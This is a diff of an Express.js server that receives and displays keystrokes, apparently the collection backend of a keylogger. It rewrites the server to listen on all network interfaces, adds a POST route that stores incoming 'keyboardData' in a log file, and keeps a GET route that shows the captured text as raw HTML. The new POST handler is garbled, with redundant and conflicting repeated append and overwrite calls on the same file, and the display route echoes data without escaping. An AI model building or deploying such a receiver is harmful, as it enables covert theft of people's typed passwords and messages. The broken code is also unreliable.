@@ -1,43 +1,63 @@
-// We import the fs module so that we can have access to the file system.
-const fs = require("fs");
-const express = require("express");
-const bodyParser = require("body-parser");
+import express from "express";
+import bodyParser from "body-parser";
+import fs from "fs";
+import os from "os";
+import { networkInterfaces } from "os";
 
-// Create the express app.
 const app = express();
 
-/* app should use bodyParser. For this example we'll use json. bodyParser allows you to
-access the body of your request.
-*/
-app.use(bodyParser.json({extended: true}));
+// Create a logs directory if it doesn't exist
+if (!fs.existsSync("./logs")) {
+  fs.mkdirSync("./logs",{recursive:true});
+}
 
-// We assign the port number 8080.
-const port = 8080;
+const port = process.env.PORT || 8080;
 
-// When a GET request is made to the "/" resource we return basic HTML.
+// Helper function to get local IP dynamically
+function getLocalIp() {
+  const nets = networkInterfaces();
+  for (const name of Object.keys(nets)) {
+    for (const net of nets[name]) {
+      if (net.family === "IPv4" && !net.internal) {
+        return net.address;
+      }
+    }
+  }
+  return "127.0.0.1";
+}
+
+app.use(express.json());
+app.use(bodyParser.json({ extended: true }));
+
+// Root endpoint: display logged keyboard data
 app.get("/", (req, res) => {
-    /* The GET request shows the data that's logged in the keyboard_capture.txt file.
-    If the file keyboard_capture.txt has not yet been created, the try catch statement will
-    throw an exception and log to the homepage that nothing's been logged yet.   
-    */ 
-    try {
-        const kl_file = fs.readFileSync("./keyboard_capture.txt", {encoding:'utf8', flag:'r'});    
-        // We send the txt file data to the server. We replace the "\n" with <br> 
-        res.send(`<h1>Logged data</h1><p>${kl_file.replace("\n", "<br>")}</p>`);
-    } catch {
-        res.send("<h1>Nothing logged yet.</h1>");
-    }  
+  try {
+    const klFile = fs.readFileSync("./logs/keyboard_capture.txt", {
+      encoding: "utf8",
+      flag: "r",
+    });
+    res.send(`<h1>Logged data</h1><p>${klFile.replace(/\n/g, "<br>")}</p>`);
+  } catch {
+    res.send("<h1>Nothing logged yet.</h1>");
+  }
 });
 
-
+// POST endpoint: receive and store keyboard data
 app.post("/", (req, res) => {
-    // For demo purposes we log the keyboardData sent as part of the body of the POST request to the server.
-    console.log(req.body.keyboardData);
-    // Will now write the keyboard capture to a text file.
-    fs.writeFileSync("keyboard_capture.txt", req.body.keyboardData);
-    res.send("Successfully set the data");
+  const data = req.body.keyboardData;
+  console.log(data);
+  console.log("Received keyboard data:", data);
+fs.appendFileSync("./logs/keyboard_capture.txt", data + "\n");
+  fs.writeFileSync("./logs/keyboard_capture.txt", data || "");
+  fs.appendFileSync("./logs/keyboard_capture.txt", data + "\n");
+  fs.writeFileSync("./logs/keyboard_capture.txt", req.body.keyboardData);
+  fs.appendFileSync("./logs/keyboard_capture.txt", data + "\n","utf8");
+  res.send("✅ Successfully logged keyboard data");
 });
-// We can see that the app is listening on which port.
-app.listen(port, () => {
-    console.log(`App is listening on port ${port}`);
+
+// Start the server
+const ip = getLocalIp();
+app.listen(port, "0.0.0.0", () => {
+  console.log(`✅ Server running at http://${ip}:${port}`);
 });
+
